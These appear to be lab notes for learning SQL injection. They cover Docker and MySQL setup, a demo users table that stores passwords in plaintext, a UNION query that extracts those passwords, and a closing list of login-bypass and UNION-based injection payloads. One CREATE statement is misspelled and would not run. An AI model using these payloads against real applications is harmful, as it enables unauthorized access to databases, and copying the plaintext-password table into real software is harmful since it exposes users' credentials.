sudo apt install docker.io

docker --version

sudo apt install docker-compose
docker-compose --version

// background docker
sudo docker-compose up -d


//show running
sudo docker ps -a

//stop
sudo docker-compose stop


// remove
sudo docker rm

// remove all
sudo docker rm $(sudo docker ps -aq)


# Start the mysql service
sudo systemctl start mysql

# login to mysql
sudo mysql

# create the database, and tables
CREAT DATABASE sqldemo;
use sqldemo;

CREATE TABLE users (
	username varchar(255),
	password varchar(255),
	age int,
	PRIMARY KEY (username)
);

# insert data into the users table
INSERT INTO users (username, password, age)
VALUES("deepak", "hello123", 21);

INSERT INTO users(username, password, age)
VALUES("ndeepak", "kittems", 23);



select age from users where username="deepak";

select age from users where username="deepak" or username ="kittems";

select age from users where username="deepak" union select password from users;




jeremy' or 1=1-- -
jeremy' or 1=1#
jeremy' union select null#
jeremy' union select null,null#
jeremy' union select null,null,null#
jeremy' union select null,null,version()#


